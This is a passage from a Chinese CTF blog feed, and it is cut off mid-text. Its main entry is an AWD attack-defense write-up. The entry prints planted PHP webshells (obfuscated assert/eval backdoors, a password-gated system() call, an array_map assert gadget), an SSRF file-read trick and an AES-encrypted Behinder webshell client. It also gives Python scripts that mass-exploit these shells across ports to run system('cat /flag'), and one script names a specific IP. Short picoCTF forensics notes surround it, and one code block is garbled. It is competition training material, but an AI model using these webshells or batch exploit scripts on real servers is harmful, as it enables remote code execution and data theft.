class="line">vnctf&#123;APT_1S_c0M1nG</span><br></pre></td></tr></table></figure><p>第二部分图片：</p><p>另存为ThisIsSecret.jpg</p><p>用工具OurSecret</p><p>解密下半部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;1&quot;&gt;1&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;vnctf-2021冰冰好像藏着秘密&quot;&gt;[VNCTF 2021]冰冰好像藏着秘密&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;发现冰冰藏着的flag，flag格式为VNCTF{*</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>AWD-1</title>
    <link href="http://mklkx.github.io/2021/03/22/AWD-1/"/>
    <id>http://mklkx.github.io/2021/03/22/AWD-1/</id>
    <published>2021-03-22T12:56:06.000Z</published>
    <updated>2021-05-04T11:38:46.927Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="simple">simple</span></h3><hr><p><strong>启示：新收获，体会到了AWD的乐趣</strong></p><blockquote><p>尽管笔者还是很菜，但是事后学会写批量化脚本成功后，还是体会到了AWD的乐趣，有点意思~</p></blockquote><hr><h4><span id="准备工作"><strong>准备工作：</strong></span></h4><p>通过WinSCP（Xshell等）连接登录后，备份/var/www/html，将此目录下的所有文件拖入D盾，发现部分漏洞。👇</p><p><img lazyload src="/images/loading.svg" data-src="DLnYgx.jpg" alt="D盾"></p><p>挨个修叭</p><hr><h4><span id="1"><em>1</em></span></h4><h5><span id="config_commonphp"><strong>.config_common.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$a&#x3D;base64_decode(&quot;Y&quot;.&quot;X&quot;.&quot;N&quot;.&quot;z&quot;.&quot;Z&quot;.&quot;X&quot;.&quot;J&quot;.&quot;0&quot;);</span><br><span class="line">$a(@$&#123;&quot;_P&quot;.&quot;O&quot;.&quot;S&quot;.&quot;T&quot;&#125;[520]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>简单分行后，将’YXNzZXJ0’进行base64加密后得’assert’,即assert(@$_POST[520]);，意为传入一个名为520的变量，方式为POST传参，后以PHP代码的方式执行。</p><p>因此，在网站上尝试POST传参’520=system(‘cat /flag’);'后可得flag。👇</p><p><img lazyload src="/images/loading.svg" data-src="DLnGCR.jpg" alt="config_common"></p><p>接下来就是批量化的过程，明确思路：</p><p>1.攻击端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port_start&#x3D;8801</span><br><span class="line">port_end&#x3D;8808</span><br><span class="line">my_port&#x3D;8802</span><br><span class="line">flag&#x3D;[]</span><br><span class="line">token&#x3D;&#39;1f208fe1a06b1d6db7ff6b7a7db3aefe&#39;</span><br></pre></td></tr></table></figure><p>2.获取flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def config_common(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;.config_common.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;520&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><p>3.提交flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in range(port_start,port_end+1):</span><br><span class="line">    if(i&#x3D;&#x3D;my_port):</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        config_common(i)</span><br><span class="line">        #pdd(i)</span><br><span class="line">        #function111(i)</span><br><span class="line">        #function4eff2(i)</span><br><span class="line">        #ciscn_notes(i)</span><br><span class="line">        #ciscn_config2(i)</span><br><span class="line">        #ciscn_include2(i)</span><br><span class="line">        #ciscn_url(i)</span><br><span class="line">        #ciscn_include(i)#冰蝎</span><br><span class="line">        #ciscn_config1(i)</span><br><span class="line">        submit_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:9090&#x2F;&#39;</span><br><span class="line">        for i in flag:</span><br><span class="line">            submit_flag&#x3D;&#123;&#39;flag&#39;:i,&#39;token&#39;:token&#125;</span><br><span class="line">            requests.post(url&#x3D;submit_url,data&#x3D;submit_flag)</span><br><span class="line">time.sleep(60*5)</span><br></pre></td></tr></table></figure><p>其中还包括异常处理的部分，可逐步完善。</p><hr><h4><span id="2"><em>2</em></span></h4><h5><span id="pddphp"><strong>pdd.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&quot;pdsdt&quot;]);?&gt;</span><br></pre></td></tr></table></figure><p>与第一题大同小异，网页命令同为’pdsdt=system(‘cat /flag’);’</p><p>贴脚本，相同部分不再赘述：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def pdd(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;pdd.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pdsdt&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="3"><em>3</em></span></h4><h5><span id="111php"><strong>111.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass&#x3D;$_POST[&quot;password&quot;];</span><br><span class="line">if($pass &#x3D;&#x3D; &quot;4eff2c041976ea22afb7092a53188c70&quot;)</span><br><span class="line">&#123;</span><br><span class="line">system($_GET[&quot;getshell&quot;]);</span><br><span class="line">readfile(&quot;&#x2F;flag&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;be1c5ff7101b7791469b5df2315cf75a&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>POST传入一个名为password的变量赋值给pass，若该变量（password=&gt;pass）==“4eff2c041976ea22afb7092a53188c70”,则系统自动返回根目录下flag的操作；若不是，则返回假的flag。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function111(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;.111.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;password&quot;:&quot;4eff2c041976ea22afb7092a53188c70&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="4"><em>4</em></span></h4><h5><span id="4eff2c041976ea22afb7092a53188c70php"><strong>4eff2c041976ea22afb7092a53188c70.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>同第一第二题，脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function4eff2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;4eff2c041976ea22afb7092a53188c70.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cmd&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="5"><em>5</em></span></h4><h5><span id="ciscn_urlphp"><strong>ciscn_url.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">$parts &#x3D; parse_url($url);</span><br><span class="line">if(empty($parts[&#39;host&#39;]) || $parts[&#39;host&#39;] !&#x3D; &#39;localhost&#39;) &#123;</span><br><span class="line">    exit(&#39;error&#39;);</span><br><span class="line">&#125;</span><br><span class="line">readfile($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>与之前不同，此为get传参一个名为url的变量，赋值给了url，经过解析后传给了parts变量，若parts变量的host部分为空或不等于’localhost’，则error。故明确该命令的正确形式应该为’?url=file://localhost/flag’</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_url(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_url.php?&#39;</span><br><span class="line">    payload &#x3D; &#123;&quot;url&quot;:&quot;file:&#x2F;&#x2F;localhost&#x2F;flag&quot;&#125;</span><br><span class="line">    req &#x3D; requests.get(url&#x3D;attack_url,params&#x3D;payload)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="6"><em>6</em></span></h4><h5><span id="ciscn_notesphp"><strong>ciscn_notes.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">include(&#39;ciscn_config.php&#39;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; mysql_real_escape_string($_GET[&#39;id&#39;]);</span><br><span class="line">    if(isset($_GET[&#39;topic&#39;]))&#123;</span><br><span class="line">        $topic &#x3D; mysql_real_escape_string($_GET[&#39;topic&#39;]);</span><br><span class="line">        $topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $topic &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id);</span><br><span class="line">    $result &#x3D; mysql_query($sql,$con);</span><br><span class="line">    $row &#x3D; mysql_fetch_array($result);</span><br><span class="line">    if(isset($row[&#39;topic&#39;])&amp;&amp;isset($row[&#39;substance&#39;]))&#123;</span><br><span class="line">        echo &quot;&lt;h1&gt;&quot;.$row[&#39;topic&#39;].&quot;&lt;&#x2F;h1&gt;&lt;br&gt;&quot;.$row[&#39;substance&#39;];</span><br><span class="line">        die();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;You&#39;re wrong!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ciscn_nt &#123;</span><br><span class="line">    var $a;</span><br><span class="line">    var $b;</span><br><span class="line">    function __construct($a,$b) &#123;</span><br><span class="line">        $this-&gt;a&#x3D;$a;</span><br><span class="line">        $this-&gt;b&#x3D;$b;</span><br><span class="line">    &#125;</span><br><span class="line">    function test() &#123;</span><br><span class="line">       array_map($this-&gt;a,$this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p1&#x3D;new ciscn_nt(assert,array($_POST[&#39;x&#39;]));</span><br><span class="line">$p1-&gt;test();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;myblog&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;..&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">        &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;#&quot;&gt;Blog&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">            &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;笔记&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;关于&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;&lt;&#x2F;nav&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;panel panel-success&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-heading&quot;&gt;</span><br><span class="line">        &lt;h1 class&#x3D;&quot;panel-title&quot;&gt;php是世界上最好的语言&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-body&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;1&amp;topic&#x3D;Welcome to PHP world&#39;&gt;Welcome to PHP world&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;2&amp;topic&#x3D;Do the best you can&#39;&gt;Do the best you can&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;3&amp;topic&#x3D;Attention, please.&#39;&gt;格式化，全都格式化。。。&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--mysql_real_escape_string()--&gt;</span><br><span class="line">&lt;!--$topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);--&gt;</span><br><span class="line">&lt;!--$sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id)--&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>观察可得该网页的php部分有一明显洞，为POST传入一个名为x的变量.</p><blockquote><p>但需要注意的是，由于该部分返回的req.text不止flag部分，故需对获得的数据做进一步处理才行</p></blockquote><p><img lazyload src="/images/loading.svg" data-src="DLn359.jpg" alt="notes"></p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_notes(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_notes.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[1][0:32]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure><h4><span id="7"><em>7</em></span></h4><h5><span id="ciscn_includephp"><strong>ciscn_include.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="linespan><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该处可通过冰蝎连接以及COOKIE传参一个名为cookie的变量’cookie=system(‘cat /flag’);'可得：</p><p>(1)冰蝎连接👇</p><p><img lazyload src="/images/loading.svg" data-src="DLnJ81.jpg" alt="bx"></p><p>批量脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#冰蝎</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def padding_zero(key) -&gt; bytes:</span><br><span class="line">    output &#x3D; list(key)</span><br><span class="line">    while len(output) % 16:</span><br><span class="line">        output.append(&#39;\x00&#39;)</span><br><span class="line">    return &#39;&#39;.join(output).encode()</span><br><span class="line"></span><br><span class="line">def padding_pkcs5(msg) -&gt; bytes:</span><br><span class="line">    if isinstance(msg, str):</span><br><span class="line">        msg &#x3D; msg.encode()</span><br><span class="line">    if len(msg) &#x3D;&#x3D; 0x10:</span><br><span class="line">        return msg + b&#39;\x10&#39; * 0x10</span><br><span class="line">    return msg + (</span><br><span class="line">        0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()</span><br><span class="line"></span><br><span class="line">def aes_encrypt(msg, key) -&gt; str:</span><br><span class="line">    key&#x3D;padding_zero(key)</span><br><span class="line">    enc &#x3D; AES.new(key, AES.MODE_CBC, b&#39;\x00&#39; * 16)</span><br><span class="line">    return base64.b64encode(enc.encrypt(padding_pkcs5(msg))).decode()</span><br><span class="line"></span><br><span class="line">def get_key(url):</span><br><span class="line">    Getparams&#x3D;&#123;&quot;pass&quot;:&quot;1&quot;&#125;</span><br><span class="line">    key &#x3D; session.get(url,params&#x3D;Getparams).content</span><br><span class="line">    key &#x3D; str(key, encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    return key</span><br><span class="line"></span><br><span class="line">def main_exec(url,command,key):</span><br><span class="line">    command &#x3D; bytes(command, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line">    command_b64&#x3D; str(base64.b64encode(command), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def main_exec_encode(url,command,key):</span><br><span class="line">    command2 &#x3D; &quot;ob_start();&quot;+command+&quot;$flag &#x3D; ob_get_contents();ob_end_clean();for($i&#x3D;0;$i&lt;10;$i++)&#123;$flag&#x3D;bin2hex($flag);$flag&#x3D;base64_encode($flag);&#125;print($flag);&quot;</span><br><span class="line">    command2 &#x3D; bytes(command2, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line"></span><br><span class="line">    command_b64 &#x3D; str(base64.b64encode(command2), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line"></span><br><span class="line">    for i in range(10):</span><br><span class="line">        res &#x3D; base64.b64decode(res)</span><br><span class="line">        res &#x3D; codecs.decode(res,&quot;hex&quot;)</span><br><span class="line">        return res</span><br><span class="line">    </span><br><span class="line">def ciscn_include(i):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;XXX:&quot;+str(i)+&quot;&#x2F;blog&#x2F;ciscn_include.php&quot;</span><br><span class="line">    command &#x3D; &quot;system(&#39;cat &#x2F;flag&#39;);&quot;</span><br><span class="line">    key &#x3D; &quot;e45e329feb5d925b&quot;</span><br><span class="line">    flag &#x3D; main_exec(url,command,key)</span><br><span class="line">    #flag2 &#x3D; main_exec_encode(url,command,key)</span><br><span class="line">    #flag&#x3D;(flag_[2:-1])</span><br><span class="line">    print(flag)</span><br><span class="line">    #print(flag2)</span><br><span class="line">    </span><br><span class="line">#冰蝎end</span><br></pre></td></tr></table></figure><p>(2)COOKIE传参脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_include2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_include.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cookie&quot;:&quot;&#x2F;flag&quot;&#125;</span><br><span class="line">    req&#x3D;requests.get(url&#x3D;attack_url,cookies&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="8"><em>8</em></span></h4><h5><span id="ciscn_configphp"><strong>ciscn_config.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Mysql閾炬帴閰嶇疆&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$con &#x3D; mysql_connect (&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;c933ccc3b6b2fe8cb830a5e76f5f98a5&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">  print(&#39;Could not connect: &#39; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(&quot;ciscn_web&quot;, $con);</span><br><span class="line"></span><br><span class="line">forward_static_call_array(assert,array($_POST[&quot;x&quot;]));</span><br><span class="line">class c</span><br><span class="line">&#123;</span><br><span class="line">        public $code &#x3D; null;</span><br><span class="line">        public $decode &#x3D; null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;       $this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">                $this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">                @Eval($this-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">new c();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第一个洞在这个部分：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">$this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">@Eval($this-&gt;decode);</span><br></pre></td></tr></table></figure><p>将一串字符串赋值给$this-&gt;code(可简单理解为一个变量);将该变量进行base64解码后，赋值给$this-&gt;decode;将此变量当作php代码执行。</p><p>因此，我们需要将此字符串进行base64解密，得’eval($_POST[pass]);’</p><p>此后操作与第一第二相同，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config1(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pass&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>第二个洞为POST传参一个名为x的参数：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;118.89.227.105:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure><hr><p>至此，以上为本人此次比赛找到的所有洞，收获颇多.</p><blockquote><p>1.隐藏在正常服务中的洞往往不容易被发现（废话）,简单删除后会因此失分，因此审代码是相当重要的能力。</p></blockquote><blockquote><p>2.提高速度，AWD往往是比手速，尽管在比赛当时笔者拿flag的方式相当弱智，但事后通过对批量化的学习以及应用加深了对此的体会。</p></blockquote><blockquote><p>3.继续努力。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;simple&quot;&gt;simple&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;启示：新收获，体会到了AWD的乐趣&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;尽管笔者还是很菜，但是事后学会写批量化脚本成功后，还是体会到了AWD的乐</summary>
      
    
    
    
    
    <category term="AWD" scheme="http://mklkx.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>picoCTF2020</title>
    <link href="http://mklkx.github.io/2021/03/22/picoCTF2020/"/>
    <id>http://mklkx.github.io/2021/03/22/picoCTF2020/</id>
    <published>2021-03-22T12:43:25.000Z</published>
    <updated>2021-05-04T11:39:01.031Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="forensics">Forensics</span></h2><hr><h3><span id="glory-of-the-garden"><em>Glory of the Garden</em></span></h3><blockquote><p><img lazyload src="/images/loading.svg" data-src="DL3wl9.jpg" alt="DL3wl9"></p><blockquote><p>What is a hex editor?</p></blockquote></blockquote><p>根据hint，拖进winhex，最后可得flag.</p><p><em>shark on wire 1</em></p><blockquote><p><a class="link" href="https://play.picoctf.org/practice/challenge/30?category=4&amp;page=1">shark on wire 1<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>Try using a tool like Wireshark;What are streams?</p></blockquote></blockquote><p>追踪UDP流，得flag。（MISC-AboutWireshark.md里编写了类似的思路）</p><h3><span id="extensions"></span></h3><blockquote><p>How do operating systems know what kind of file it is? (It’s not just the ending!Make sure to submit the flag as picoCTF{XXXXX}</p></blockquote><p>直接打开是一txt文件，观察可指为png的文件格式，更改后缀名可得flag.</p><h3><span id="so-meta"><em>So Meta</em></span></h3><blockquote><p><img lazyload src="/images/loading.svg" data-src="DL3UW4.png" alt="So Meta"></p><blockquote><p>What does meta mean in the context of files?Ever heard of metadata?</p></blockquote></blockquote><p>同第一题，Winhex打开搜索关键词得flag.</p><h3><span id="what-lies-within"><em>What Lies Within</em></span></h3><blockquote><p><img lazyload src="/images/loading.svg" data-src="DL3dSJ.png" alt="buildings"></p><blockquote><p>There is data encoded somewhere… there might be an online decoder.</p></blockquote></blockquote><p><a class="link" href="https://stylesuxx.github.io/steganography/">图片隐写<i class="fas fa-external-link-alt"></i></a>在线网站可得，工具get</p><h3><span id="whitepages"></span></h3><blockquote><p>I stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank!</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">text&#x3D;&#39;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                &#39;</span><br><span class="line">firstType &#x3D; &#39; &#39;</span><br><span class="line">secondType &#x3D;  &#39; &#39;</span><br><span class="line">binaryString &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for char in text: #Foreach char</span><br><span class="line">    if char &#x3D;&#x3D; firstType: #Check if it is the first type</span><br><span class="line">        binaryString +&#x3D; &#39;0&#39; #Mark it as 0</span><br><span class="line">    else:</span><br><span class="line">        